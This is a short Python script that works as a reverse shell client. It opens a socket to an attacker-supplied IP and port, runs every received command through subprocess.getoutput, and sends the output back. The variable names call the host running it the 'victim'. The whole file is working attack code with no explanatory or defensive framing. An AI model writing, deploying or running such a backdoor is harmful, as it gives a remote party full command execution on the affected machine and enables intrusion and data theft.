from re import sub
import socket
import sys
import subprocess

ip = sys.argv[1]
port = sys.argv[2]
victim = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
victim.connect((ip, int(port)))
print(f'[+] Connected to {ip}:{port}')

try:
    while True:
        cmd = victim.recv(4096)
        op = subprocess.getoutput(cmd.decode())
        victim.send(op.encode()) 

except KeyboardInterrupt:
    victim.send(b'Connection closed by the victim..')
    victim.close()



    


